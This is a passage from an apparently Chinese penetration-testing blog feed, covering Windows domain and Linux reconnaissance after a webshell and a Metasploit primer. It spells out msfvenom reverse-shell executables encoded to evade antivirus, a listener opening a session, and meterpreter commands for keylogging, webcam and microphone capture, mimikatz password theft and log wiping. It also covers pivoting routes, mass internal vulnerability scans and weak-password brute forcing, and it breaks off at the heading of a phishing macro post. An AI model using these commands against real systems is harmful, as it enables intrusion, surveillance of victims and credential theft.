Administrator工作站正运行于        NetBT_Tcpip_{8BF769C5-CA65-4810-907F-038B7869DB89} (000C29B502C8)        NetBT_Tcpip_{ADFDD8BB-7022-41D8-9F42-0407E9C8D417} (000C29B502BE)        NetBT_Tcpip_{E707AA31-65E2-4165-AB18-4F54A186BBBA} (000C29B502B4)软件版本                     Windows Server 2008 R2 Standard工作站域                     HACK工作站域 DNS 名称            hack.local登录域                       WIN08-WEBCOM 打开超时 (秒)            0COM 发送计数 (字节)          16COM 发送超时 (毫秒)          250命令成功完成。</code></pre><p><img src="/img/webshellInfoGather/1e4bb211-55c0-4685-8c9d-a4978291dc3f.png" alt="img"></p><h3 id="0x01-11-远程桌面连接历史记录"><a href="#0x01-11-远程桌面连接历史记录" class="headerlink" title="0x01-11 远程桌面连接历史记录"></a>0x01-11 远程桌面连接历史记录</h3><p><strong>cmdkey /l</strong></p><p><strong>把凭证取下来-&gt;本地解密</strong></p><pre><code>cmdkey /l            获得Windows系统的远程桌面连接历史记录</code></pre><p><img src="/img/webshellInfoGather/33332f9c-f9ff-43d3-a967-a60d1e0081de.png" alt="img"></p><h3 id="0x01-12-查看本机上的用户帐号列表"><a href="#0x01-12-查看本机上的用户帐号列表" class="headerlink" title="0x01-12 查看本机上的用户帐号列表"></a>0x01-12 查看本机上的用户帐号列表</h3><p><strong>net user</strong></p><pre><code>C:\Users\Administrator\Desktop&gt;net user\\WIN08-WEB 的用户帐户-------------------------------------------------------------------------------Administrator            Guest命令成功完成。</code></pre><h3 id="0x01-13-查看本机用户XXX的信息"><a href="#0x01-13-查看本机用户XXX的信息" class="headerlink" title="0x01-13 查看本机用户XXX的信息"></a>0x01-13 查看本机用户XXX的信息</h3><p><strong>net user XXX</strong></p><pre><code>C:\Users\Administrator\Desktop&gt;net user administrator用户名                 Administrator全名注释                   管理计算机(域)的内置帐户用户的注释国家/地区代码          000 (系统默认值)帐户启用               Yes帐户到期               从不上次设置密码           2019/8/5 13:56:26密码到期               2019/9/16 13:56:26密码可更改             2019/8/6 13:56:26需要密码               Yes用户可以更改密码       Yes允许的工作站           All登录脚本用户配置文件主目录上次登录               2019/10/10 19:35:21可允许的登录小时数     All本地组成员             *Administrators全局组成员             *None命令成功完成。</code></pre><h3 id="0x01-13-查看本机用户XXX的信息-1"><a href="#0x01-13-查看本机用户XXX的信息-1" class="headerlink" title="0x01-13 查看本机用户XXX的信息"></a>0x01-13 查看本机用户XXX的信息</h3><pre><code>net user /domain        显示所在域的用户名单net user 域用户 /domain  获取某个域用户的详细信息net user /domain XXX 12345678 修改域用户密码，需要域管理员权限</code></pre><p><img src="/img/webshellInfoGather/92fbcaaa-d0b2-4817-b8cf-843e7831d3b0.png" alt="img"></p><p><img src="/img/webshellInfoGather/55059794-90ca-4078-9fd7-359674d47631.png" alt="img"></p><h2 id="0x02-Windows（域）"><a href="#0x02-Windows（域）" class="headerlink" title="0x02 Windows（域）"></a>0x02 Windows（域）</h2><pre><code>nltest /domain_trusts /all_trusts /v /server:192.168.52.2       返回所有信任192.168.52.2的域。nltest /dsgetdc:hack /server:192.168.52.2                   返回域控和其相应的IP地址，hack是上步骤结果中的一个域C:\Windows\System32&gt;nltest /domain_trusts /all_trusts /v /server:192.168.52.2域信任的列表:    0: HACK hack.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)       Dom Guid: 50fbcf3b-a8b3-4205-b903-f1bef54dde44       Dom Sid: S-1-5-21-675002476-827761145-2127888524此命令成功完成C:\Windows\System32&gt;nltest /dsgetdc:hack /server:192.168.52.2           DC: \\WINDOWS_SERVER_      地址: \\192.168.52.2     Dom Guid: 50fbcf3b-a8b3-4205-b903-f1bef54dde44     Dom 名称: HACK  林名称: hack.local DC 站点名称: Default-First-Site-Name我们的站点名称: Default-First-Site-Name        标志: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS 0x1C000此命令成功完成</code></pre><p><img src="/img/webshellInfoGather/777b7fd0-9737-41c7-b015-86414d4c1062.png" alt="img"></p><pre><code>net user /do            获取域用户列表</code></pre><p><img src="/img/webshellInfoGather/4184ece1-0213-4541-ba79-778b267f098b.png" alt="img"></p><pre><code>net group &quot;domain admins&quot; /domain       获取域管理员列表net group &quot;domain controllers&quot; /domain  查看域控制器(如果有多台)net group &quot;domain computers&quot; /domain    查看域机器net group /domain                       查询域里面的工作组</code></pre><p><img src="/img/webshellInfoGather/780137ea-c6db-4e3d-a546-64246c3be6a8.png" alt="img"></p><p><img src="/img/webshellInfoGather/32800240-4a39-475f-8a65-904054694ae7.png" alt="img"></p><p><img src="/img/webshellInfoGather/26c1ee37-8d42-41b0-81e9-3213e81a13c8.png" alt="img"></p><p><img src="/img/webshellInfoGather/35459f68-dcfc-47e5-94cd-f845766a9478.png" alt="img"></p><pre><code>net localgroup administrators 本机管理员[通常含有域用户]net localgroup administrators /domain       登录本机的域管理员net localgroup administrators workgroup\user001 /add        域用户添加到本机</code></pre><p><img src="/img/webshellInfoGather/4e4036d0-b68d-47ce-a891-89eda1450c5d.png" alt="img"></p><p><img src="/img/webshellInfoGather/5b82127c-4a29-4ea7-a32e-5a3fb1017568.png" alt="img"></p><pre><code>Net view                查看同一域内机器列表net view \\ip           查看某IP共享Net view \\GHQ          查看GHQ计算机的共享资源列表。net view /domain        查看内网存在多少个域Net view /domain:XYZ    查看XYZ域中的机器列表。</code></pre><p><img src="/img/webshellInfoGather/fadfddf5-6367-414a-85b3-3b2d1fc897f2.png" alt="img"></p><pre><code>net accounts /domain    # 查询域用户密码过期等信息爆破域用户弱口令</code></pre><p><img src="/img/webshellInfoGather/577e3194-24de-45b3-8ef7-2697b23d2f7a.png" alt="img"></p><h2 id="0x03-Linux"><a href="#0x03-Linux" class="headerlink" title="0x03 Linux"></a>0x03 Linux</h2><h3 id="0x03-1-查看当前权限"><a href="#0x03-1-查看当前权限" class="headerlink" title="0x03-1 查看当前权限"></a>0x03-1 查看当前权限</h3><p><strong>whoami</strong></p><p><img src="/img/webshellInfoGather/8be5a148-dc6e-4b5c-8fc4-3de55557efa2.png" alt="img"></p><h3 id="0x03-2-查看网卡配置"><a href="#0x03-2-查看网卡配置" class="headerlink" title="0x03-2 查看网卡配置"></a>0x03-2 查看网卡配置</h3><p><strong>ifconfig</strong></p><p><img src="/img/webshellInfoGather/c643c2bf-cffe-427a-b581-378a6a0792ae.png" alt="img"></p><h3 id="0x03-3-查看端口状态（开启了哪些服务，内网IP连接等）"><a href="#0x03-3-查看端口状态（开启了哪些服务，内网IP连接等）" class="headerlink" title="0x03-3 查看端口状态（开启了哪些服务，内网IP连接等）"></a>0x03-3 查看端口状态（开启了哪些服务，内网IP连接等）</h3><p><strong>netstat -anpt</strong></p><p><img src="/img/webshellInfoGather/28adef80-ea81-4446-80c2-bbd8fe54f8cb.png" alt="img"></p><h3 id="0x03-4-查看进程状态（开启了哪些服务等）"><a href="#0x03-4-查看进程状态（开启了哪些服务等）" class="headerlink" title="0x03-4 查看进程状态（开启了哪些服务等）"></a>0x03-4 查看进程状态（开启了哪些服务等）</h3><p><strong>ps -ef</strong></p><p><img src="/img/webshellInfoGather/61bd759f-1dc5-4437-ab8f-cd9274f5e5d9.png" alt="img"></p><h3 id="0x03-5-查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"><a href="#0x03-5-查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）" class="headerlink" title="0x03-5 查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"></a>0x03-5 查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）</h3><p><strong>cat /root/.bash_history</strong></p><p><img src="/img/webshellInfoGather/ed2e0ba9-1e0d-4c56-977b-4cfdef880054.png" alt="img"></p><h3 id="0x03-6-查找某个文件-寻找配置文件等"><a href="#0x03-6-查找某个文件-寻找配置文件等" class="headerlink" title="0x03-6 查找某个文件(寻找配置文件等)"></a>0x03-6 查找某个文件(寻找配置文件等)</h3><p><strong>find / -name *.cfg</strong></p><p><img src="/img/webshellInfoGather/b3d5106e-4c23-4845-87fc-93949f3e3638.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网边界信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF扫盲</title>
      <link href="/2020/12/05/msf-sao-mang/"/>
      <url>/2020/12/05/msf-sao-mang/</url>
      
        <content type="html"><![CDATA[<h1 id="Metasplot-Framework"><a href="#Metasplot-Framework" class="headerlink" title="Metasplot Framework"></a>Metasplot Framework</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><pre><code>0x00 简介0x01 安装Metasploit(Windows和Linux)0x02 msfvenom0x03 监听0x04 Meterpreter命令0x05 路由0x06 内网扫描</code></pre><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>MetaSploit-Framework简介</p><p>​&emsp;&emsp;Metasploit是一款开源的渗透测试框架平台，到目前为止，msf已经内置了数千个 已披露的漏洞相关的模块和渗透测试工具，模块使用ruby语言编写，这使得使用者 能够根据需要对模块进行适当修改，甚至是调用自己写的测试模块。选定需要使用 的攻击模块之后，你只需要使用简单的命令配置一些参数就能完成针对一个漏洞的 测试和利用，将渗透的过程自动化、简单化。</p><p>相关术语</p><pre><code>Exploit：攻击通过利用msf中的脚本对目标系统实施精准打击或漏洞验证Payload：攻击载荷攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码Listener：监听器生成木马之后发给受害主机，监听反弹木马连入本机</code></pre><h2 id="0x01-安装Metasploit"><a href="#0x01-安装Metasploit" class="headerlink" title="0x01 安装Metasploit"></a>0x01 安装Metasploit</h2><pre><code>Linux:curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&amp; \  ./msfinstallWindows:访问：https://metasploit.help.rapid7.com/docs/installing-the-metasploit-framework下载地址：http://windows.metasploit.com/metasploitframework-latest.msi</code></pre><h3 id="0x01-1-windows下载安装"><a href="#0x01-1-windows下载安装" class="headerlink" title="0x01-1 windows下载安装"></a>0x01-1 windows下载安装</h3><pre><code>访问：https://metasploit.help.rapid7.com/docs/installing-the-metasploit-framework下载地址：http://windows.metasploit.com/metasploitframework-latest.msi</code></pre><p>运行metasploitframework-latest.msi，一路安装下去</p><p>然后到C:\metasploit-framework\bin，运行msfconsole.bat</p><p><img src="/img/MSFLiteracy/af72f89b-8854-4f38-8858-e88a6acdeb03.png" alt="img"></p><p><img src="/img/MSFLiteracy/e1eb34c1-9110-414d-8c76-130ba3178359.png" alt="img"></p><h3 id="0x01-2-Linux环境下载安装"><a href="#0x01-2-Linux环境下载安装" class="headerlink" title="0x01-2 Linux环境下载安装"></a>0x01-2 Linux环境下载安装</h3><pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&amp; \  ./msfinstall</code></pre><p>输入命令msfconsole进入控制台</p><p><img src="/img/MSFLiteracy/c73d7094-f29c-46a2-b14f-adde298e7992.jpg" alt="img"></p><h2 id="0x02-msfvenom"><a href="#0x02-msfvenom" class="headerlink" title="0x02 msfvenom"></a>0x02 msfvenom</h2><p>metasploit-framework旗下的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）已然成为历史，取而代之的是msfvenom。</p><pre class="line-numbers language-bash"><code class="language-bash">Options:    -p, --payload    <span class="token operator">&lt;</span>payload<span class="token operator">></span>       指定需要使用的payload<span class="token punctuation">(</span>攻击荷载<span class="token punctuation">)</span>。如果需要使用自定义的payload，请使用<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#039;-&amp;#039;或者stdin指定</span>    -l, --list       <span class="token punctuation">[</span>module_type<span class="token punctuation">]</span>   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all    -n, --nopsled    <span class="token operator">&lt;</span>length<span class="token operator">></span>        为payload预先指定一个NOP滑动长度    -f, --format     <span class="token operator">&lt;</span>format<span class="token operator">></span>        指定输出格式 <span class="token punctuation">(</span>使用 --help-formats 来获取msf支持的输出格式列表<span class="token punctuation">)</span>    -e, --encoder    <span class="token punctuation">[</span>encoder<span class="token punctuation">]</span>       指定需要使用的encoder（编码器）    -a, --arch       <span class="token operator">&lt;</span>architecture<span class="token operator">></span>  指定payload的目标架构        --platform   <span class="token operator">&lt;</span>platform<span class="token operator">></span>      指定payload的目标平台    -s, --space      <span class="token operator">&lt;</span>length<span class="token operator">></span>        设定有效攻击荷载的最大长度    -b, --bad-chars  <span class="token operator">&lt;</span>list<span class="token operator">></span>          设定规避字符集，比如: <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#039;\x00\xff&amp;#039;</span>    -i, --iterations <span class="token operator">&lt;</span>count<span class="token operator">></span>         指定payload的编码次数    -c, --add-code   <span class="token operator">&lt;</span>path<span class="token operator">></span>          指定一个附加的win32 shellcode文件    -x, --template   <span class="token operator">&lt;</span>path<span class="token operator">></span>          指定一个自定义的可执行文件作为模板    -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行        --payload-options            列举payload的标准选项    -o, --out   <span class="token operator">&lt;</span>path<span class="token operator">></span>               保存payload    -v, --var-name <span class="token operator">&lt;</span>name<span class="token operator">></span>            指定一个自定义的变量，以确定输出格式        --shellest                   最小化生成payload    -h, --help                       查看帮助选项        --help-formats               查看msf支持的输出格式列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-1-payloads"><a href="#0x02-1-payloads" class="headerlink" title="0x02-1 payloads"></a>0x02-1 payloads</h3><pre><code>msfvenom -l payloads                                                    列出payloadsmsfvenom -l payloads | grep windows/meterpreter                         筛选出windows系统的payloadsmsfvenom -p windows/meterpreter/reverse_tcp --payload-options           查看某个payloads的参数有windows，Linux，android等个平台的payload</code></pre><p><img src="/img/MSFLiteracy/eff99ff9-4e2b-4e67-b339-5cd68b78a80b.png" alt="img"></p><p><img src="/img/MSFLiteracy/b2dd61b8-b3cc-410f-8053-1b4b800eb79f.jpg" alt="img"></p><p><img src="/img/MSFLiteracy/42c4b4cd-1d72-46f4-9670-8896615ee69f.jpg" alt="img"></p><h3 id="0x02-2-编码"><a href="#0x02-2-编码" class="headerlink" title="0x02-2 编码"></a>0x02-2 编码</h3><pre><code>msfvenom -l encoders常用的编码：cmd/powershell_base64         excellent  Powershell Base64 Command Encoderx86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</code></pre><p><img src="/img/MSFLiteracy/22aad99c-71c5-4ba3-84c4-00afe7d6c187.jpg" alt="img"></p><h3 id="0x02-3-nops选项（空字段模块／一切为了绕过和免杀"><a href="#0x02-3-nops选项（空字段模块／一切为了绕过和免杀" class="headerlink" title="0x02-3 nops选项（空字段模块／一切为了绕过和免杀"></a>0x02-3 nops选项（空字段模块／一切为了绕过和免杀</h3><pre><code>msfvenom -l nops</code></pre><p><img src="/img/MSFLiteracy/dfb22d58-a4ec-497a-889a-ed3b9a85dc71.jpg" alt="img"></p><h3 id="0x02-4-生成payload"><a href="#0x02-4-生成payload" class="headerlink" title="0x02-4 生成payload"></a>0x02-4 生成payload</h3><p><strong>msfvenom生成payload的常见格式为：</strong></p><pre><code>msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</code></pre><p><strong>最简单型</strong></p><pre><code>最简单型：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.168.237 LPORT=4444 -f exe -o reverse_shell.exemsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.168.237 LPORT=4444 -f exe -o reverse_shell.exe-p 指定payload，windows/meterpreter/reverse_tcp          是32位的windows系统反弹shell的payload               windows/x64/meterpreter/reverse_tcp      是64位的windows系统反弹shell的payloadLHOST msf的IPLPORT msf监听的端口-f 生成的格式为exe-o 输出到本地名为reverse_shel.exe</code></pre><p><img src="/img/MSFLiteracy/b63a353d-c76f-4ab7-89cf-3aa80c362be9.jpg" alt="img"></p><p><strong>编码处理型：</strong></p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.168.237 -e x86/shikata_ga_nai -i 11 -f exe -o reverse_shell2.exe-a                      64或32位系统--platform windows      指定windows系统-e x86/shikata_ga_nai   编码格式-i 5                    编码次数X&gt;reverse_shell.exe     -f exe -o reverse_shell.exe</code></pre><p><img src="/img/MSFLiteracy/118f1232-a8b3-4aa0-812e-ea650de35f92.jpg" alt="img"></p><h2 id="0x03-监听"><a href="#0x03-监听" class="headerlink" title="0x03 监听"></a>0x03 监听</h2><pre><code>msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.168.237lhost =&gt; 192.168.168.237msf5 exploit(multi/handler) &gt; set lport 5555lport =&gt; 5555msf5 exploit(multi/handler) &gt; exploit[*] Started reverse TCP handler on 192.168.168.237:5555 [*] Sending stage (179779 bytes) to 192.168.168.191[*] Meterpreter session 1 opened (192.168.168.237:5555 -&gt; 192.168.168.191:52691) at 2019-12-23 14:57:58 +0800meterpreter &gt; </code></pre><p><img src="/img/MSFLiteracy/ec107dc6-0fb1-47d0-af80-f1f4854c2fc6.jpg" alt="img"></p><p>快速监听</p><pre><code>handler -H 192.168.168.237 -P 5555 -p windows/meterpreter/reverse_tcp</code></pre><p><img src="/img/MSFLiteracy/c13152f7-2301-4cc9-8311-39433164d216.jpg" alt="img"></p><h2 id="0x04-Meterpreter命令"><a href="#0x04-Meterpreter命令" class="headerlink" title="0x04 Meterpreter命令"></a>0x04 Meterpreter命令</h2><pre><code>查看有多少会话sessions -l连接会话sessions -i id查看会话命令meterpreter &gt; help查看进程meterpreter &gt; ps进程注入meterpreter &gt; migrate idvnc查看桌面meterpreter &gt; run vnc录音meterpreter &gt; record_mic -d 10开启摄像头meterpreter &gt; webcam_stream 屏幕截图meterpreter &gt; getdesktop系统信息meterpreter &gt; sysinfo取密码meterpreter &gt; load mimikatz      加载法国面包meterpreter &gt; msv                获取密码meterpreter &gt; kerberos           获取密码meterpreter &gt; clearev            清除日志截图meterpreter &gt; screenshot获取最高权限meterpreter &gt; getsystem进入目标机器shellmeterpreter &gt; shell键盘记录meterpreter &gt; keyscan_startmeterpreter &gt; keyscan_dumpmeterpreter &gt; keyscan_stop录音meterpreter &gt; record_mic -d 10打开摄像头meterpreter &gt; webcam_stream上传文件meterpreter &gt; upload /root/shellcode/1.txt c:\\windows\\temp\\下载文件meterpreter &gt; download c:\\windows\\temp\\2.txt /root/shellcode/Reboot      重启电脑Reg        修改注册表Shutdown    关闭电脑hashdump     下载hash</code></pre><p>查看会话，连接会话</p><pre><code>sessions -lsessions -i id</code></pre><p><img src="/img/MSFLiteracy/d39da17b-821b-45d1-b1bc-3d9a5924afaa.jpg" alt="img"></p><p>查看进程</p><pre><code>ps</code></pre><p><img src="/img/MSFLiteracy/ddf71609-b6c0-462c-9e11-dd6673334b43.jpg" alt="img"></p><p>进程注入</p><pre><code>migrate pid</code></pre><p><img src="/img/MSFLiteracy/5c371968-ae7b-426a-b12d-95a214017005.jpg" alt="img"></p><p><img src="/img/MSFLiteracy/6c246064-d073-4cfb-b5d0-eabcda95cac2.jpg" alt="img"></p><p>vnc查看桌面</p><pre><code>run vnc</code></pre><p><img src="/img/MSFLiteracy/21d4158c-d12f-4270-9794-4b6d228db630.jpg" alt="img"></p><p>取密码</p><pre><code>meterpreter &gt; load mimikatz      加载法国面包meterpreter &gt; msv                获取密码meterpreter &gt; kerberos           获取密码meterpreter &gt; clearev            清除日志</code></pre><p><img src="/img/MSFLiteracy/b183dc05-c535-4c22-b62a-be68eea63606.jpg" alt="img"></p><p>系统信息</p><pre><code>sysinfo</code></pre><p><img src="/img/MSFLiteracy/3cd1ab53-4122-4a71-930d-6a2fc0bef8a5.jpg" alt="img"></p><p>截图</p><pre><code>screenshot</code></pre><p><img src="/img/MSFLiteracy/c1385f73-57d8-42f2-9e4a-0318e745290c.jpg" alt="img"></p><p>获取system权限</p><pre><code>meterpreter &gt; getsystem</code></pre><p><img src="/img/MSFLiteracy/90fc0c25-c3a1-4f9b-b7d2-741e771a19a9.jpg" alt="img"></p><p>键盘记录</p><pre><code>keyscan_startkeyscan_dumpkeyscan_stop</code></pre><p><img src="/img/MSFLiteracy/0eaf8513-1cc9-449d-87f9-67b0e1f01f45.jpg" alt="img"></p><p>录音</p><pre><code>apt-get install mplayer  record_mic -hrecord_mic -d 10mplayer xxx.wav </code></pre><p><img src="/img/MSFLiteracy/0b173e88-19e2-41d6-b144-2e8c59fc37c7.jpg" alt="img"></p><p><img src="/img/MSFLiteracy/805db813-3b3e-4b28-b0b6-fe67ee15162f.jpg" alt="img"></p><p>打开摄像头</p><pre><code>webcam_stream</code></pre><p><img src="/img/MSFLiteracy/00e77eb2-3ec0-46a3-beff-7c3ce9895e68.jpg" alt="img"></p><p>上传文件和下载文件</p><pre><code>upload /root/shellcode/1.txt c:\\windows\\temp\\download c:\\windows\\temp\\2.txt /root/shellcode/</code></pre><p><img src="/img/MSFLiteracy/c59f1454-5a8b-43cb-a923-08e97e6881f3.jpg" alt="img"></p><h2 id="0x05-路由"><a href="#0x05-路由" class="headerlink" title="0x05 路由"></a>0x05 路由</h2><pre><code>添加目标指定内网段路由的方式进行存活探测     1-1、扫描10.10.101.0/24meterpreter &gt; run get_local_subnets meterpreter &gt; run autoroute -s 10.10.101.0 -n 255.255.255.0 注意这个掩码,实战中要根据机目标机器上的掩码来的,不要闭着眼睛就直接给 0/24,不然有些机器可能会被漏掉 meterpreter &gt; run autoroute -p 路由添加完以后,习惯性的看下到底有没有加上【+】注意：此处案例是扫描其他段的时候，需要将路由也设置为其他段，例如：前面是扫描10.10.101段，现在要扫描10.10.102段，则路由设置为10.10.102段！    2-1、扫描10.10.102.0/24meterpreter &gt; run get_local_subnets meterpreter &gt; run autoroute -s 10.10.102.0 -n 255.255.255.0 注意这个掩码,实战中要根据机目标机器上的掩码来的,不要闭着眼睛就直接给 0/24,不然有些机器可能会被漏掉 meterpreter &gt; run autoroute -p 路由添加完以后,习惯性的看下到底有没有加上【+】注意：此处案例是子网掩码为25,且rhost也设置为/25    3-1、扫描10.10.101.0/24meterpreter &gt; run get_local_subnets meterpreter &gt; run autoroute -s 163.20.81.0 -n 255.255.255.128 注意这个掩码,实战中要根据机目标机器上的掩码来的,不要闭着眼睛就直接给 0/24,不然有些机器可能会被漏掉 meterpreter &gt; run autoroute -p 路由添加完以后,习惯性的看下到底有没有加上删除路由run autoroute -d -s 10.10.101.0/24</code></pre><p>添加路由</p><p><img src="/img/MSFLiteracy/0fd018c2-3c96-4a31-a732-3c38c329f48f.jpg" alt="img"></p><p>删除路由</p><p><img src="/img/MSFLiteracy/4f9f62f4-5076-4834-b8f7-5facbeeedadd.jpg" alt="img"></p><h2 id="0x06-内网扫描"><a href="#0x06-内网扫描" class="headerlink" title="0x06 内网扫描"></a>0x06 内网扫描</h2><pre><code>端口扫描use auxiliary/scanner/portscan/tcpmsf5 auxiliary(scanner/portscan/tcp) &gt; set rhosts 192.168.168.0/24msf5 auxiliary(scanner/portscan/tcp) &gt; set ports 80msf5 auxiliary(scanner/portscan/tcp) &gt; set threads 100msf5 auxiliary(scanner/portscan/tcp) &gt; runms17010漏洞扫描msf &gt; use auxiliary/scanner/smb/smb_ms17_010 msf &gt; set rhosts 192.168.1.0/24 msf &gt; set rport 445 msf &gt; set threads 3msf &gt; run 内网Jbossmsf &gt; use auxiliary/scanner/http/jboss_vulnscanmsf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65msf &gt; set threads 5msf &gt; set rport 8080msf &gt; set rport 80msf &gt; run内网Tomcatmsf &gt; use auxiliary/admin/http/tomcat_administration [ 此模块只适合 tomcat 5.5 以下的版本,对于高版本,我们完全还有很多其它的替代品 ]msf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65msf &gt; set rport 8080msf &gt; set rport 80msf &gt; set threads 5msf &gt; set tomcat_user tomcatmsf &gt; set tomcat_pass tomcatmsf &gt; run内网 jenkins 默认登陆口弱口令msf &gt; use auxiliary/scanner/http/jenkins_loginmsf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65msf &gt; set rport 8080msf &gt; set rport 80msf &gt; set threads 5msf &gt; set username adminmsf &gt; set password adminmsf &gt; run内网批量 ssh 单口令探测msf &gt; use auxiliary/scanner/ssh/ssh_loginmsf &gt; set rhosts 172.16.41.3,1,2,26,23,24,25,21,22,48,95,252 172.16.40.1,2,16,17 172.16.14.99,152 msf &gt; set username adminmsf &gt; set username rootmsf &gt; set password P@ssw0rdmsf &gt; set threads 5msf &gt; runbash 远程执行 [getshell]msf &gt; use auxiliary/scanner/http/apache_mod_cgi_bash_envmsf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65msf &gt; set rport 80msf &gt; set rport 8080msf &gt; set targeturi /cgi-bin/test.cgimsf &gt; run心脏滴血[循环抓密码]msf &gt; use auxiliary/scanner/http/apache_optionsbleedmsf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65msf &gt; set rport 443msf &gt; set threads 3msf &gt; run尝试对内网 web 进行批量 put 利用尝试msf &gt; use auxiliary/scanner/http/http_putmsf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65msf &gt; set filedata session logsmsf &gt; set filename tmp.txtmsf &gt; set rport 80msf &gt; set rport 8080msf &gt; set threads 3msf &gt; run批量探测内网的下所有 ftp 种类及详细版本msf &gt; use auxiliary/scanner/ftp/ftp_versionmsf &gt; set rhosts 172.16.41.0/24 172.16.52.0/24 172.16.40.0/24 172.16.14.0/24 172.16.54.0/24 172.16.56.0/24 172.16.53.0/24msf &gt; set threads 5msf &gt; run[+] 172.16.41.72:21 - FTP Banner: &#39;220 Microsoft FTP Service\x0d\x0a&#39;[+] 172.16.14.152:21 - FTP Banner: &#39;220 (vsFTPd 2.0.7)\x0d\x0a&#39;[+] 172.16.14.253:21 - FTP Banner: &#39;220 (vsFTPd 2.2.2)\x0d\x0a&#39;[+] 172.16.53.59:21 - FTP Banner: &#39;220 Microsoft FTP Service\x0d\x0a&#39;接着,拿着上面已经获取到的所有 ftp server 的 ip 继续尝试批量匿名读写msf &gt; use auxiliary/scanner/ftp/anonymousmsf &gt; set rhosts 172.16.41.72 172.16.14.152,253 172.16.53.59msf &gt; set threads 1msf &gt; run内网中尝试批量 nfs 挂载msf &gt; use auxiliary/scanner/nfs/nfsmountmsf &gt; set rhosts 172.16.41.0/24 172.16.52.0/24 172.16.40.0/24 172.16.14.0/24 172.16.54.0/24 172.16.56.0/24 172.16.53.0/24msf &gt; set threads 5msf &gt; run批量探测内网可匿名访问的 rsync,通常情况下这些 rsync 都是做 web 的同步备份的,所以里面可能包含有大量目标站点的敏感信息[账号密码]msf &gt; use auxiliary/scanner/rsync/modules_listmsf &gt; set rhosts 172.16.41.0/24 172.16.52.0/24 172.16.40.0/24 172.16.14.0/24 172.16.54.0/24 172.16.56.0/24 172.16.53.0/24msf &gt; set rport 873msf &gt; set threads 5msf &gt; run</code></pre><p><img src="/img/MSFLiteracy/9362ae5a-0f98-4195-adc2-cd6a173bba95.jpg" alt="img"></p><p><img src="/img/MSFLiteracy/e440ad41-a1c4-4dd5-b2ca-d31257f26011.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> MetasplotFramework </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF扫盲 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼与社工系列之office宏</title>
      <link href="/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/"/>
      <url>/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/</url>
      
